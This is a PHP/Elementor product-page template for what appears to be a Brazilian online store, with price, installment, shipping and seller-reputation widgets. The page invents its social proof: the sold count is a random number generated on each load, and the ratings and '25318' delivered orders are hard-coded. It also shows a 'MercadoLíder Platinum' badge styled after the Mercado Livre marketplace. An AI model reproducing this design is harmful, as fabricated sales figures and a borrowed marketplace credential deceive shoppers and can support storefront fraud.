<div class="elementor-column elementor-col-20 elementor-top-column elementor-element elementor-element-51410408" data-id="51410408" data-element_type="column">
<div class="elementor-widget-wrap">
</div>
</div>
</div>
</section>
<section class="elementor-section elementor-top-section elementor-element elementor-element-503a9296 elementor-section-full_width elementor-section-height-default elementor-section-height-default" data-id="503a9296" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
<div class="elementor-container elementor-column-gap-default">
<div class="elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-7e378515" data-id="7e378515" data-element_type="column">
<div class="elementor-widget-wrap elementor-element-populated">
<div class="elementor-element elementor-element-4b2804a5 elementor-widget elementor-widget-html" data-id="4b2804a5" data-element_type="widget" data-widget_type="html.default">
<div class="elementor-widget-container">
<div class="container-fluid color-line" style="background: linear-gradient(to right, #000, <?php echo $cor;?>, #000, <?php echo $cor;?>); height: 6px; width: 100%;">
</div>		</div>
</div>
</div>
</div>
</div>
</section>
<section class="elementor-section elementor-top-section elementor-element elementor-element-6792de6 elementor-hidden-desktop elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="6792de6" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
<div class="elementor-container elementor-column-gap-default">
<div class="elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-8fa618a" data-id="8fa618a" data-element_type="column" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
<div class="elementor-widget-wrap elementor-element-populated">
<div class="elementor-element elementor-element-69002344 elementor-widget elementor-widget-heading" data-id="69002344" data-element_type="widget" data-widget_type="heading.default">
<div class="elementor-widget-container">
<h2 class="elementor-heading-title elementor-size-default"><?php echo $nomeproduto;?>!</h2>		</div>
</div>
<div class="elementor-element elementor-element-79ed7a4a elementor-widget elementor-widget-image" data-id="79ed7a4a" data-element_type="widget" data-widget_type="image.default">
<div class="elementor-widget-container">
<img decoding="async" width="320" height="32" src="./arquivos/pre-bf-produto_c20bae4f-7115-4a58-9ac7-96d2dd25cba1-1.gif" class="attachment-large size-large" alt="" loading="lazy" />															</div>
</div>
<div class="elementor-element elementor-element-d0e0e37 elementor-widget elementor-widget-html" data-id="d0e0e37" data-element_type="widget" data-widget_type="html.default">
<div class="elementor-widget-container">
<span class="quantitysell" style="font-size: 12px;color: #b7b7b7;">Novo | <!--INICIO VENDIDOS--><?php echo rand(999,9999);?> Vendidos<!--FIM VENDIDOS--></span>		</div>
</div>
<div class="elementor-element elementor-element-76c7d93b elementor-widget elementor-widget-html" data-id="76c7d93b" data-element_type="widget" data-widget_type="html.default">
<div class="elementor-widget-container">
<div style="margin-top: 4px;font-size:13px;color: #b7b7b7;">
<span class="product-meta__sku-number">(Cód. Item 17621205)</span> 
<span class="quantitysell" style="color: #3A2A2F;"> | </span>
<span class="quantitysell" style="color: #0086ff;">Disponível em estoque.</span>
</div>		</div>
</div>
<div class="elementor-element elementor-element-190f5cb3 elementor-widget-mobile__width-initial elementor--star-style-star_fontawesome elementor-widget elementor-widget-star-rating" data-id="190f5cb3" data-element_type="widget" data-widget_type="star-rating.default">
<div class="elementor-widget-container">
<style>/*! elementor - v3.6.1 - 23-03-2022 */
.elementor-star-rating{color:#ccd6df;font-family:eicons;display:inline-block}.elementor-star-rating i{display:inline-block;position:relative;font-style:normal;cursor:default}.elementor-star-rating i:before{content:"\e934";display:block;font-size:inherit;font-family:inherit;position:absolute;overflow:hidden;color:#f0ad4e;top:0;left:0}.elementor-star-rating .elementor-star-empty:before{content:none}.elementor-star-rating .elementor-star-1:before{width:10%}.elementor-star-rating .elementor-star-2:before{width:20%}.elementor-star-rating .elementor-star-3:before{width:30%}.elementor-star-rating .elementor-star-4:before{width:40%}.elementor-star-rating .elementor-star-5:before{width:50%}.elementor-star-rating .elementor-star-6:before{width:60%}.elementor-star-rating .elementor-star-7:before{width:70%}.elementor-star-rating .elementor-star-8:before{width:80%}.elementor-star-rating .elementor-star-9:before{width:90%}.elementor-star-rating__wrapper{display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-align:center;-ms-flex-align:center;align-items:center}.elementor-star-rating__title{margin-right:10px}.elementor-star-rating--align-right .elementor-star-rating__wrapper{text-align:right;-webkit-box-pack:end;-ms-flex-pack:end;justify-content:flex-end}.elementor-star-rating--align-left .elementor-star-rating__wrapper{text-align:left;-webkit-box-pack:start;-ms-flex-pack:start;justify-content:flex-start}.elementor-star-rating--align-center .elementor-star-rating__wrapper{text-align:center;-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center}.elementor-star-rating--align-justify .elementor-star-rating__title{margin-right:auto}@media (max-width:1024px){.elementor-star-rating-tablet--align-right .elementor-star-rating__wrapper{text-align:right;-webkit-box-pack:end;-ms-flex-pack:end;justify-content:flex-end}.elementor-star-rating-tablet--align-left .elementor-star-rating__wrapper{text-align:left;-webkit-box-pack:start;-ms-flex-pack:start;justify-content:flex-start}.elementor-star-rating-tablet--align-center .elementor-star-rating__wrapper{text-align:center;-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center}.elementor-star-rating-tablet--align-justify .elementor-star-rating__title{margin-right:auto}}@media (max-width:767px){.elementor-star-rating-mobile--align-right .elementor-star-rating__wrapper{text-align:right;-webkit-box-pack:end;-ms-flex-pack:end;justify-content:flex-end}.elementor-star-rating-mobile--align-left .elementor-star-rating__wrapper{text-align:left;-webkit-box-pack:start;-ms-flex-pack:start;justify-content:flex-start}.elementor-star-rating-mobile--align-center .elementor-star-rating__wrapper{text-align:center;-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center}.elementor-star-rating-mobile--align-justify .elementor-star-rating__title{margin-right:auto}}.last-star{letter-spacing:0}.elementor--star-style-star_unicode .elementor-star-rating{font-family:Arial,Helvetica,sans-serif}.elementor--star-style-star_unicode .elementor-star-rating i:not(.elementor-star-empty):before{content:"\002605"}</style>
<div class="elementor-star-rating__wrapper">
<div class="elementor-star-rating" title="5/5" itemtype="http://schema.org/Rating" itemscope="" itemprop="reviewRating"><i class="elementor-star-full">&#xE934;</i><i class="elementor-star-full">&#xE934;</i><i class="elementor-star-full">&#xE934;</i><i class="elementor-star-full">&#xE934;</i><i class="elementor-star-full">&#xE934;</i> <span itemprop="ratingValue" class="elementor-screen-only">5/5</span></div>		</div>
</div>
</div>
<div class="elementor-element elementor-element-7e5f0de9 elementor-widget-mobile__width-initial elementor-widget elementor-widget-text-editor" data-id="7e5f0de9" data-element_type="widget" data-widget_type="text-editor.default">
<div class="elementor-widget-container">
<style>/*! elementor - v3.6.1 - 23-03-2022 */
.elementor-widget-text-editor.elementor-drop-cap-view-stacked .elementor-drop-cap{background-color:#818a91;color:#fff}.elementor-widget-text-editor.elementor-drop-cap-view-framed .elementor-drop-cap{color:#818a91;border:3px solid;background-color:transparent}.elementor-widget-text-editor:not(.elementor-drop-cap-view-default) .elementor-drop-cap{margin-top:8px}.elementor-widget-text-editor:not(.elementor-drop-cap-view-default) .elementor-drop-cap-letter{width:1em;height:1em}.elementor-widget-text-editor .elementor-drop-cap{float:left;text-align:center;line-height:1;font-size:50px}.elementor-widget-text-editor .elementor-drop-cap-letter{display:inline-block}</style>


<p>4.9 (392 Avaliações)</p>


</div>
</div>
<div class="elementor-element elementor-element-43c97ff0 elementor-widget elementor-widget-image" data-id="43c97ff0" data-element_type="widget" data-widget_type="image.default">



<!-- IMAGEM PRODUTO INICIAL -->

<div class="elementor-widget-container">
<?php 
$t1 = "arquivos/produtos/".$codigo."/"; 
$t2 = glob($t1 . "*.png");

foreach($t2 as $t3){

echo '<img id="trocaimg" decoding="async" width="500" height="324" src="'.$t3.'?skin='. rand(999999999,999999999) .'" class="attachment-large size-large" alt="" />';

}
?>
</div>



</div>
<div class="elementor-element elementor-element-23727896 elementor-widget-divider--view-line elementor-widget elementor-widget-divider" data-id="23727896" data-element_type="widget" id="buy" data-widget_type="divider.default">
<div class="elementor-widget-container">
<style>/*! elementor - v3.6.1 - 23-03-2022 */
.elementor-widget-divider{--divider-border-style:none;--divider-border-width:1px;--divider-color:#2c2c2c;--divider-icon-size:20px;--divider-element-spacing:10px;--divider-pattern-height:24px;--divider-pattern-size:20px;--divider-pattern-url:none;--divider-pattern-repeat:repeat-x}.elementor-widget-divider .elementor-divider{display:-webkit-box;display:-ms-flexbox;display:flex}.elementor-widget-divider .elementor-divider__text{font-size:15px;line-height:1;max-width:95%}.elementor-widget-divider .elementor-divider__element{margin:0 var(--divider-element-spacing);-ms-flex-negative:0;flex-shrink:0}.elementor-widget-divider .elementor-icon{font-size:var(--divider-icon-size)}.elementor-widget-divider .elementor-divider-separator{display:-webkit-box;display:-ms-flexbox;display:flex;margin:0;direction:ltr}.elementor-widget-divider--view-line_icon .elementor-divider-separator,.elementor-widget-divider--view-line_text .elementor-divider-separator{-webkit-box-align:center;-ms-flex-align:center;align-items:center}.elementor-widget-divider--view-line_icon .elementor-divider-separator:after,.elementor-widget-divider--view-line_icon .elementor-divider-separator:before,.elementor-widget-divider--view-line_text .elementor-divider-separator:after,.elementor-widget-divider--view-line_text .elementor-divider-separator:before{display:block;content:"";border-bottom:0;-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1;border-top:var(--divider-border-width) var(--divider-border-style) var(--divider-color)}.elementor-widget-divider--element-align-left .elementor-divider .elementor-divider-separator>.elementor-divider__svg:first-of-type{-webkit-box-flex:0;-ms-flex-positive:0;flex-grow:0;-ms-flex-negative:100;flex-shrink:100}.elementor-widget-divider--element-align-left .elementor-divider-separator:before{content:none}.elementor-widget-divider--element-align-left .elementor-divider__element{margin-left:0}.elementor-widget-divider--element-align-right .elementor-divider .elementor-divider-separator>.elementor-divider__svg:last-of-type{-webkit-box-flex:0;-ms-flex-positive:0;flex-grow:0;-ms-flex-negative:100;flex-shrink:100}.elementor-widget-divider--element-align-right .elementor-divider-separator:after{content:none}.elementor-widget-divider--element-align-right .elementor-divider__element{margin-right:0}.elementor-widget-divider:not(.elementor-widget-divider--view-line_text):not(.elementor-widget-divider--view-line_icon) .elementor-divider-separator{border-top:var(--divider-border-width) var(--divider-border-style) var(--divider-color)}.elementor-widget-divider--separator-type-pattern{--divider-border-style:none}.elementor-widget-divider--separator-type-pattern.elementor-widget-divider--view-line .elementor-divider-separator,.elementor-widget-divider--separator-type-pattern:not(.elementor-widget-divider--view-line) .elementor-divider-separator:after,.elementor-widget-divider--separator-type-pattern:not(.elementor-widget-divider--view-line) .elementor-divider-separator:before,.elementor-widget-divider--separator-type-pattern:not([class*=elementor-widget-divider--view]) .elementor-divider-separator{width:100%;min-height:var(--divider-pattern-height);-webkit-mask-size:var(--divider-pattern-size) 100%;mask-size:var(--divider-pattern-size) 100%;-webkit-mask-repeat:var(--divider-pattern-repeat);mask-repeat:var(--divider-pattern-repeat);background-color:var(--divider-color);-webkit-mask-image:var(--divider-pattern-url);mask-image:var(--divider-pattern-url)}.elementor-widget-divider--no-spacing{--divider-pattern-size:auto}.elementor-widget-divider--bg-round{--divider-pattern-repeat:round}.rtl .elementor-widget-divider .elementor-divider__text{direction:rtl}</style>		<div class="elementor-divider">
<span class="elementor-divider-separator">
</span>
</div>
</div>
</div>
<div class="elementor-element elementor-element-2d651e69 elementor-widget-mobile__width-initial elementor-widget elementor-widget-text-editor" data-id="2d651e69" data-element_type="widget" data-widget_type="text-editor.default">
<div class="elementor-widget-container">
<p>Preço:</p>						</div>
</div>

<script>
window.onload=function(){
var preco1 = "<?php echo $valor;?>";
var xt = preco1 * 1; 
var info = xt.toLocaleString('pt-br', {minimumFractionDigits: 2});
document.getElementById("prince1").innerHTML="R$ "+info;
document.getElementById("prince2").innerHTML="R$ "+info;
}
</script>

<div class="elementor-element elementor-element-60a6a7a0 elementor-widget__width-initial elementor-widget elementor-widget-text-editor" data-id="60a6a7a0" data-element_type="widget" data-widget_type="text-editor.default">
<div class="elementor-widget-container">
<!--<p><span style="color: #ff5959;"><del>R$ 99.90</del></span></p>-->
<h3><strong>
<span style="color: #00d864;" id="prince1"></span></strong></h3>						</div>
</div>

<div class="elementor-element elementor-element-31f7d6bf elementor-mobile-align-center elementor-widget-mobile__width-initial elementor-icon-list--layout-traditional elementor-list-item-link-full_width elementor-widget elementor-widget-icon-list" data-id="31f7d6bf" data-element_type="widget" data-widget_type="icon-list.default">
<div class="elementor-widget-container">
<ul class="elementor-icon-list-items">
<li class="elementor-icon-list-item">
<span class="elementor-icon-list-icon">
<i aria-hidden="true" class="fas fa-arrow-down"></i>						</span>
<span class="elementor-icon-list-text"><?php echo $desconto;?>%</span>
</li>
</ul>
</div>
</div>

<div class="elementor-element elementor-element-7ad31693 elementor-widget elementor-widget-text-editor" data-id="7ad31693" data-element_type="widget" data-widget_type="text-editor.default">
<div style="margin-top:5px !important;" class="elementor-widget-container">
<div class="produto-det-preco-parcelamento">Em até <b>12x</b> de <b>R$ <?php echo number_format($parcela12[0],2,",",".");?></b></div>						</div>
</div>
<div class="elementor-element elementor-element-67a66748 elementor-widget__width-initial elementor-widget elementor-widget-text-editor" data-id="67a66748" data-element_type="widget" data-widget_type="text-editor.default">
<div class="elementor-widget-container">
</div>
</div>

<!--
<div class="elementor-element elementor-element-48572236 elementor-mobile-align-center elementor-widget-mobile__width-initial elementor-icon-list--layout-traditional elementor-list-item-link-full_width elementor-widget elementor-widget-icon-list" data-id="48572236" data-element_type="widget" data-widget_type="icon-list.default">
<div class="elementor-widget-container">
<ul class="elementor-icon-list-items">
<li class="elementor-icon-list-item">
<span class="elementor-icon-list-text">R$ 50 de desconto</span>
</li>
</ul>
</div>
</div>-->




<div style="text-align:center;" class="elementor-element elementor-element-40d4aaff elementor-align-center elementor-mobile-align-right elementor-widget elementor-widget-button" data-id="40d4aaff" data-element_type="widget" data-widget_type="button.default">
<div class="elementor-widget-container">
<div class="elementor-button-wrapper">




<a style="box-shadow: 0px 0px 10px 0px #000000 !important; background-color: <?php echo $cor;?> !important;" href="checkout.php?checkId=<?php echo md5(rand(999999999,999999999));?>&marketingId=<?php echo time();?>&produto=<?php echo $codigo;?>" class="elementor-button-link elementor-button elementor-size-lg" role="button">
<span class="elementor-button-content-wrapper">
<span class="elementor-button-icon elementor-align-icon-left">
<i aria-hidden="true" class="fas fa-shopping-basket"></i>			</span>
<span class="elementor-button-text">COMPRAR AGORA</span>
</span>
</a>


</div>
</div>
</div>
<div class="elementor-element elementor-element-366a84cd elementor-widget elementor-widget-html" data-id="366a84cd" data-element_type="widget" id="custom-address" data-widget_type="html.default">
<div class="elementor-widget-container">
<div class="fretefundo" style="border-color: #0062AC">

<!--CORREIOS-->

<img decoding="async" style="margin: -10px 5px -10px -8px" src="./arquivos/correios-logo_1.svg?v=<?php echo time();?>">
<p class="ttl-frete">Entrega via Correios©
<span class="ip-frete" id="custom-address">Envio EXPRESSO para todo Brasil</b></span></p>
<p class="txt-frete">Frete Grátis</p>

<!--CORREIOS-->

<style>

@media (max-width: 640px) {
.fretefundo > img {
height: 52px;
}
.fretefundo > p > span {
font-size: 10px;
}
.fretefundo {
margin-top: 0;
}
.txt-frete {
font-size: 10px;
color: #0062AC;
font-weight: bold;
padding: 0;
margin: 0;
margin-right: -5px!important;
}
}

.fretefundo {
display: flex;
flex-direction: row;
justify-content: space-between;
align-items: center;
}

.ttl-frete {
flex-grow: 1;
font-size: 14px;
line-height: 1.6;
margin-bottom: 0;
color: var(--text-color);
}

@media (min-width: 641px){
.txt-frete {
font-size: 12px;
color: #0062AC;
font-weight: bold;
padding: 0;
margin: 0;
}}

.ip-frete {
display: block;
font-size: 12px;
font-weight: 400;
color: #0062AC;
}

</style>

</div>


</div>
</div>
<div class="elementor-element elementor-element-9d541f2 elementor-widget elementor-widget-html" data-id="9d541f2" data-element_type="widget" data-widget_type="html.default">
<div class="elementor-widget-container">
<style>

.mp_platinum {

min-width: 325px;
max-width: 100%;
margin: 0 auto;
padding: 10px;
border: 0px solid #0000001a;
border-radius: 10px;
box-shadow: 0px 8px 4px -4px /*#0062AC*/ #fff;
margin-top: 20px;

}

.mp_platinum li {
list-style: none;
}

.mp_platinum p {
margin: 5px;
}

.ui-box-component-pdp__visible--desktop {
width: 100%;
border-radius: 8px;
border: 1px solid rgba(0,0,0,.1);
margin: 24px 0;
padding: 32px 16px 24px;
}

.ui-seller-info__status-info {
display: -webkit-flex;
display: flex;
margin-bottom: 20px;
}

.ui-seller-info__status-info__icon {
margin: 2px 10px 0 0;
width: 20px;
text-align: center;
}

.ui-pdp-color--GREEN.ui-pdp-icon {
fill: #0062AC;
}

.ui-pdp-seller__status-title {

font-size: 16px;
font-weight: 600;
color: #0062AC;
padding: 0;
margin: 2px 0 -12px 0 !important;

}

.ui-seller-info__status-info__subtitle {

font-size: 14px;
color: rgba(0,0,0,.55);
margin: 5px 0 0 0 !important;

}

.ui-thermometer {

width: 100%;
height: auto;
margin: 0;
padding: 0;
-webkit-appearance: none;
-moz-appearance: none;
appearance: none;
overflow: hidden;
display: block;
-moz-box-sizing: border-box;
box-sizing: border-box;
vertical-align: baseline;

}

.ui-thermometer__level {
width: 20%;
height: 8px;
margin-top: 2px;
-moz-box-sizing: border-box;
box-sizing: border-box;
float: left;
border-left: 6px solid #fff;
}

.ui-thermometer__level--1 {
background: #fff0f0;
}

.ui-thermometer__level--2 {
background: #fff5e8;
}

.ui-thermometer__level--3 {
background: #fffcda;
}

.ui-thermometer__level--4 {
background: #f1fdd7;
}

.ui-thermometer[value="5"] .ui-thermometer__level--5 {
height: 12px;
margin: 0;
background: #0062AC;
}

.ui-pdp-seller__reputation-info {
margin-top: 16px;
}

.ui-pdp-seller__list-description {

display: -webkit-flex;
display: flex;
justify-content: center;
margin: 0;
padding: 0;

}

.ui-pdp-seller__item-description {

display: -webkit-flex;
display: flex;
-webkit-flex-direction: column;
flex-direction: column;
-webkit-align-items: center;
align-items: center;
text-align: center;
font-size: 12px;
position: relative;
line-height: 1;
padding: 8px 5px;

}

.ui-pdp-seller__sales-description {
font-size: 24px;
color: #000;
line-height: 1.2;
font-weight: 400;
display: block;
}

.ui-pdp-seller__text-description {
margin-top: 8px;
line-height: 1;
}

.ui-pdp-seller__item-description:after {
background: #ddd;
content: "";
height: 91%;
position: absolute;
right: 0;
top: 8%;
width: 1px;
}

.ui-pdp-seller__item-description:last-of-type:after {
display: none;
}

.ui-pdp-seller__icon-description {
display: inline-block;
width: 28px;
padding-top: 3px;
vertical-align: top;
}

.ui-pdp-icon, .ui-pdp-icon--shipping {
fill: rgba(0,0,0,.25);
}



</style><div style="padding: 12px 20px 1px 20px; border-radius: 12px 12px 0 0; background: #f5f5f5; margin-top: 40px; display: flex;">

<div style="margin-right: 18px">

<svg version="1.1" id="Capa_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 488.636 488.636" width="45" height="45" style="widht: 13%;" xml:space="preserve"><g><g>

<path fill="#0062AC" d="M384.936,125.936c7.1,0,9.1-9.6,2.7-12.5l-249.9-110.8c-15.2-6.8-33.1,0-39.9,15.3l-87.5,196.2 c-6.8,15.2,0,33.1,15.3,39.9l50.4,21.8c6.3,2.8,13.5-1.8,13.5-8.7v-83.3c0-31.9,25.9-57.8,57.8-57.8h237.6V125.936z"></path>
<path fill="#0062AC" d="M450.336,153.136h-303.1c-16.9,0-30.6,13.7-30.6,30.6v214.1c0,16.9,13.7,30.6,30.6,30.6h40.7c-1-6-1.5-12.1-1.5-18.3 c0-7,0.7-13.8,1.9-20.5h-32.8v-102.5h286.6v102.4h-32.9c1.2,6.7,1.9,13.5,1.9,20.5c0,6.2-0.5,12.3-1.5,18.3h40.7 c16.9,0,30.6-13.7,30.6-30.6v-214C480.936,166.836,467.236,153.136,450.336,153.136z M442.136,224.036h-286.6v-32.1h286.6V224.036 z"></path>
<path fill="#0062AC" d="M298.836,331.436c-43.4,0-78.6,35.2-78.6,78.6s35.2,78.6,78.6,78.6s78.6-35.2,78.6-78.6S342.236,331.436,298.836,331.436z M321.436,441.036c-3.4,4.2-7.9,7-13.1,8.4c-2.3,0.6-3.3,1.8-3.2,4.2c0.1,2.3,0,4.6,0,7c0,2.1-1.1,3.2-3.1,3.2 c-2.5,0.1-5,0.1-7.5,0c-2.2,0-3.2-1.3-3.2-3.4c0-1.7,0-3.4,0-5.1c0-3.7-0.2-3.9-3.8-4.5c-4.6-0.7-9.1-1.8-13.3-3.8 c-3.3-1.6-3.7-2.4-2.7-5.9c0.7-2.6,1.4-5.2,2.2-7.7c0.9-3,1.7-3.3,4.5-1.9c4.7,2.4,9.6,3.8,14.8,4.4c3.3,0.4,6.6,0.1,9.7-1.3 c5.8-2.5,6.7-9.2,1.8-13.2c-1.7-1.4-3.5-2.4-5.5-3.2c-5.1-2.2-10.4-3.9-15.1-6.8c-7.8-4.6-12.7-11-12.1-20.5 c0.6-10.7,6.7-17.3,16.5-20.9c4-1.5,4.1-1.4,4.1-5.6c0-1.4,0-2.9,0-4.3c0.1-3.2,0.6-3.7,3.8-3.8c1,0,2,0,2.9,0 c6.8,0,6.8,0,6.8,6.8c0,4.8,0,4.8,4.8,5.5c3.6,0.6,7.1,1.6,10.5,3.1c1.9,0.8,2.6,2.1,2,4.1c-0.8,2.9-1.6,5.9-2.6,8.7 c-0.9,2.7-1.8,3.1-4.4,1.9c-5.3-2.6-10.8-3.6-16.6-3.3c-1.5,0.1-3,0.3-4.4,0.9c-5,2.2-5.9,7.8-1.6,11.2c2.2,1.7,4.6,3,7.2,4.1 c4.5,1.8,8.9,3.6,13.2,6C327.236,412.636,330.936,429.536,321.436,441.036z"></path></g></g><g></g><g></g><g></g><g></g><g></g><g></g>

</svg>
</div>  

<p style="line-height: 20px; font-size: 14px;">Parcele suas compras<br><b style="color: #0062AC">nas melhores bandeiras</b></p>

</div>		</div>
</div>
<div class="elementor-element elementor-element-259e3f1b elementor-widget elementor-widget-image" data-id="259e3f1b" data-element_type="widget" data-widget_type="image.default">
<div class="elementor-widget-container">
<img decoding="async" width="590" height="86" src="./arquivos/bandeiras-1.png" class="attachment-large size-large" />															</div>
</div>
<div class="elementor-element elementor-element-6c4cd4b4 elementor-widget elementor-widget-html" data-id="6c4cd4b4" data-element_type="widget" data-widget_type="html.default">
<div class="elementor-widget-container">
<div class="mp_platinum">

<div class="ui-seller-info">

<div class="ui-seller-info__status-info">


<img decoding="async" src="./arquivos/aaa3939.png?v=<?php echo time();?>">


<div style="margin: 9px 0 0px 11px;">
<p class="ui-seller-info__status-info__title ui-pdp-seller__status-title">MercadoLíder Platinum</p>
<p class="ui-seller-info__status-info__subtitle">Um dos melhores sites!</p>
</div>
</div>
<ul aria-hidden="true" class="ui-thermometer" value="5">
<li class="ui-thermometer__level ui-thermometer__level--1"></li>
<li class="ui-thermometer__level ui-thermometer__level--2"></li>
<li class="ui-thermometer__level ui-thermometer__level--3"></li>
<li class="ui-thermometer__level ui-thermometer__level--4"></li>
<li class="ui-thermometer__level ui-thermometer__level--5"></li>
</ul>
<div class="ui-pdp-seller__reputation-info">
<ul class="ui-pdp-seller__list-description">
<li class="ui-pdp-seller__item-description">

<strong class="ui-pdp-seller__sales-description">25318</strong>

<p class="ui-pdp-seller__text-description">Pedidos entregues nos últimos 60 dias</p>
</li>
<li class="ui-pdp-seller__item-description">
<strong aria-hidden="true" class="ui-pdp-seller__icon-description">
<svg class="ui-pdp-icon ui-pdp-icon--message-positive ui-pdp-color--REP_SELLER_ATTENTION_GOOD" viewBox="0 0 29 24" xmlns="http://www.w3.org/2000/svg">
<g fill-rule="evenodd" fill="none">
<path d="M6.747 21.511l4.538-3.518h8.238c1.032 0 1.868-.98 1.868-2.19V3.21c0-1.21-.836-2.19-1.868-2.19H3.173c-1.032 0-1.869.98-1.869 2.19v14.077c0 .39.316.706.706.706H5.61v2.96a.706.706 0 0 0 1.138.558z" stroke-width="1.5" stroke="#333"></path>
<g transform="translate(14 9)">
<circle cx="7.5" cy="7.5" r="7.5" fill="#39B54A"></circle>
<g stroke-linecap="round" stroke-width="1.059" stroke="#FFF"><path d="M3.75 7.5l2.445 2.445M6.25 9.89L11.14 5"></path></g>
</g>
</g>
</svg>
</strong>
<p class="ui-pdp-seller__text-description">Presta bom atendimento</p>
</li>
<li class="ui-pdp-seller__item-description">
<strong aria-hidden="true" class="ui-pdp-seller__icon-description">
<svg class="ui-pdp-icon ui-pdp-icon--time-positive ui-pdp-color--REP_SELLER_DELIVERY_TIME_GOOD" viewBox="0 0 30 26" xmlns="http://www.w3.org/2000/svg">
<g fill-rule="evenodd" fill="none">
<g transform="translate(1 .02)" stroke="#333">
<ellipse cx="10.5" cy="13.714" rx="10.5" ry="10.286" stroke-width="1.286"></ellipse>
<path d="M19.107 13.714h-1.59M3.42 13.714H1.83M10.5 5.143v1.59M10.563 20.571v1.59M10.5.857v2.484M8.75.857h3.637M10.313 8.801v4.944H5.24" stroke-linecap="round" stroke-width="1.102"></path>
</g>
<g transform="translate(15 10.02)">
<circle cx="7.5" cy="7.5" r="7.5" fill="#39B54A"></circle>
<g stroke-linecap="round" stroke-width="1.059" stroke="#FFF"><path d="M3.75 7.5l2.445 2.445M6.25 9.89L11.14 5"></path></g>
</g>
</g>
</svg>
</strong>
<p class="ui-pdp-seller__text-description">Entrega os produtos dentro do prazo</p>
</li>
</ul>
</div>
</div>

</div>		</div>
</div>
</div>
</div>
</div>
</section>
<section class="elementor-section elementor-top-section elementor-element elementor-element-7404a38a elementor-hidden-tablet elementor-hidden-mobile elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="7404a38a" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
<div class="elementor-container elementor-column-gap-default">
<div class="elementor-column elementor-col-50 elementor-top-column elementor-element elementor-element-32b9208a" data-id="32b9208a" data-element_type="column" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
<div class="elementor-widget-wrap elementor-element-populated">
<section class="elementor-section elementor-inner-section elementor-element elementor-element-3706487a elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="3706487a" data-element_type="section">
<div class="elementor-container elementor-column-gap-default">
<div class="elementor-column elementor-col-100 elementor-inner-column elementor-element elementor-element-723aa39a" data-id="723aa39a" data-element_type="column" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
<div class="elementor-widget-wrap elementor-element-populated">







<div class="elementor-element elementor-element-7d6003ef elementor-widget elementor-widget-image" data-id="7d6003ef" data-element_type="widget" data-widget_type="image.default">
<div class="elementor-widget-container">
<?php 
$t1 = "arquivos/produtos/".$codigo."/"; 
$t2 = glob($t1 . "*.png");

foreach($t2 as $t3){

echo '<img id="trocaimg" decoding="async" width="500" height="324" src="'.$t3.'?skin='. rand(999999999,999999999) .'" class="attachment-large size-large" alt="" />';

}
?>
</div>



</div>
</div>
</div>
</section>
<section class="elementor-section elementor-inner-section elementor-element elementor-element-45a692b2 elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="45a692b2" data-element_type="section">
<div class="elementor-container elementor-column-gap-default">
<div class="elementor-column elementor-col-100 elementor-inner-column elementor-element elementor-element-10c261a2" data-id="10c261a2" data-element_type="column" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
<div class="elementor-widget-wrap elementor-element-populated">
<div class="elementor-element elementor-element-102cc8d9 elementor-widget elementor-widget-heading" data-id="102cc8d9" data-element_type="widget" data-widget_type="heading.default">
<div class="elementor-widget-container">
<h2 class="elementor-heading-title elementor-size-default">Descrição</h2>		</div>
</div>
<div class="elementor-element elementor-element-5cda298f elementor-widget elementor-widget-image" data-id="5cda298f" data-element_type="widget" data-widget_type="image.default">







<div class="elementor-widget-container">
<?php 

$z1 = "arquivos/produtos/".$codigo."/descricao/"; 
$z2 = glob($z1 . "*.png");

foreach($z2 as $z3){

echo '<img decoding="async" width="300" height="262" src="'.$z3.'?skin2='. rand(999999999,999999999) .'" class="attachment-large size-large" alt="" loading="lazy" />';

}

?>
</div>






</div>
<div class="elementor-element elementor-element-9874ee elementor-widget elementor-widget-text-editor" data-id="9874ee" data-element_type="widget" data-widget_type="text-editor.default">



<!-- DESCRÇÃO-->

<div class="elementor-widget-container">
<p><?php echo $descricao; ?></p>
</div>



</div>
</div>
</div>
</div>
</section>
</div>
</div>
<div class="elementor-column elementor-col-50 elementor-top-column elementor-element elementor-element-619431df" data-id="619431df" data-element_type="column">
<div class="elementor-widget-wrap elementor-element-populated">
<section class="elementor-section elementor-inner-section elementor-element elementor-element-3d8816a elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="3d8816a" data-element_type="section" data-settings="{&quot;sticky&quot;:&quot;top&quot;,&quot;sticky_on&quot;:[&quot;desktop&quot;,&quot;tablet&quot;],&quot;sticky_parent&quot;:&quot;yes&quot;,&quot;sticky_offset&quot;:0,&quot;sticky_effects_offset&quot;:0}">
<div class="elementor-container elementor-column-gap-default">
<div class="elementor-column elementor-col-100 elementor-inner-column elementor-element elementor-element-4bfc2f87" data-id="4bfc2f87" data-element_type="column" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
<div class="elementor-widget-wrap elementor-element-populated">
<div class="elementor-element elementor-element-779e56ec elementor-widget elementor-widget-heading" data-id="779e56ec" data-element_type="widget" data-widget_type="heading.default">
<div class="elementor-widget-container">
<h2 class="elementor-heading-title elementor-size-default"><?php echo $nomeproduto;?></h2>		</div>
</div>
<div class="elementor-element elementor-element-7ac03fee elementor-widget elementor-widget-html" data-id="7ac03fee" data-element_type="widget" data-widget_type="html.default">
<div class="elementor-widget-container">
<span class="quantitysell" style="font-size: 12px;color: #b7b7b7;">Novo | <!--INICIO VENDIDOS--><?php echo rand(999,9999);?> Vendidos<!--FIM VENDIDOS--></span>		</div>
</div>
